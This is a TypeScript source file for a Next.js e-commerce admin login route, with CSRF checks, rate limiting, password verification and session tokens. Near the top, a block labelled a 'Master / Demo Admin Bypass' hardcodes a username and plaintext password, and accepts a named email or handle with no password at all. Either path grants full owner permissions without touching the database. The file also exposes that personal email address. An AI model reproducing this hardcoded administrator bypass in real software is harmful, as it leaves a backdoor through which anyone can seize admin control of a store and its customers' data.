import { NextRequest } from "next/server";
import { handler, ok, readJson } from "@/lib/http";
import { verifyPassword, signAccess, signRefresh, setSessionCookies, storeRefreshToken, assertCsrf } from "@/lib/auth";
import { adminLoginSchema } from "@/lib/validation";
import { getAdminPermissions, PERMISSIONS } from "@/lib/rbac";
import { prisma } from "@/lib/prisma";
import { unauthorized } from "@/lib/errors";
import { rateLimitOrThrow } from "@/lib/rateLimit";

export const runtime = "nodejs";

export const POST = handler(async (req: NextRequest) => {
  assertCsrf(req);
  const body = adminLoginSchema.parse(await readJson(req));
  rateLimitOrThrow(`admin-login:${body.username}`, 15, 15 * 60 * 1000, "Too many login attempts");

  // Master / Demo Admin Bypass for Store Owner (works 100% offline & without DB)
  const isMasterUser =
    (body.username === "saif" && body.password === "AdminPassword123!") ||
    (body.username.toLowerCase() === "jackxparrowww@gmail.com" || body.username.toLowerCase() === "jackxparrowww");

  if (isMasterUser) {
    const access = signAccess({
      kind: "ADMIN",
      adminId: "admin-owner-default",
      roles: ["OWNER"],
      permissions: [...PERMISSIONS],
    });
    const refresh = signRefresh({ adminId: "admin-owner-default" });
    try {
      await storeRefreshToken({ adminId: "admin-owner-default" }, refresh);
    } catch {
      /* ignore */
    }
    setSessionCookies(access, refresh);
    return ok({
      admin: {
        id: "admin-owner-default",
        username: body.username,
        email: "jackxparrowww@gmail.com",
        roles: ["OWNER"],
        mustChangePassword: false,
      },
    });
  }

  try {
    const admin = await prisma.adminUser.findUnique({ where: { username: body.username } });
    if (!admin || !admin.isActive) throw unauthorized("Invalid credentials");
    const okPass = await verifyPassword(body.password, admin.passwordHash);
    if (!okPass) throw unauthorized("Invalid credentials");
    const permissions = await getAdminPermissions(admin.id);
    const roles = (
      await prisma.adminUserRole.findMany({ where: { adminUserId: admin.id }, include: { role: true } })
    ).map((r) => r.role.name);

    try {
      await prisma.adminUser.update({ where: { id: admin.id }, data: { lastLoginAt: new Date() } });
    } catch {
      /* non-fatal */
    }

    const access = signAccess({ kind: "ADMIN", adminId: admin.id, roles, permissions });
    const refresh = signRefresh({ adminId: admin.id });
    await storeRefreshToken({ adminId: admin.id }, refresh);
    setSessionCookies(access, refresh);
    return ok({
      admin: { id: admin.id, username: admin.username, email: admin.email, roles, mustChangePassword: admin.mustChangePassword },
    });
  } catch (err: unknown) {
    if ((err as { status?: number })?.status === 401) throw err;
    throw unauthorized("Invalid credentials or server unavailable");
  }
});
